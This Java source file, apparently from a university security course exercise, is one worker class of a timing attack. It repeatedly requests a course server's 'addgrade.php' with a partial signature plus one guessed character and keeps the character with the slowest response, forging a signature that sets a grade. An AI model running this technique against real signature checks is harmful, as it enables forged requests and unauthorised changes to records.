package main;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.math.BigInteger;
import java.net.URL;
import java.net.URLConnection;

public class Processor implements Runnable {
	private TimingAttack attack;
	private char c;

	public Processor(TimingAttack attack, char c) {
		this.c = c;
		this.attack = attack;
	}

	@Override
	public void run() {
		URL url = null;

		URLConnection yc = null;

		StringBuilder a = null;

		BigInteger duration = BigInteger.ZERO;
		long startTime = System.nanoTime();

		for (int j = 0; j < 100; j++) {

			try {

				url = new URL("https://eitn41.eit.lth.se:3119/ha4/addgrade.php?name=Kalle&grade=5&signature=6823ea50b133c58cba" + c);

				yc = url.openConnection();

				BufferedReader in = new BufferedReader(new InputStreamReader(yc.getInputStream(), "UTF-8"));
				String inputLine;
				a = new StringBuilder();
				while ((inputLine = in.readLine()) != null) {
					a.append(inputLine);
				}
				in.close();

			} catch (IOException e) {

				e.printStackTrace();
			}

		}

		long endTime = System.nanoTime();
		duration = BigInteger.valueOf((endTime - startTime) / 100);
		// System.out.println(duration);

		if (attack.isMax(duration)) {
			attack.setCorrect(c);
		}

		// attack.addTooList(duration);

	}

}
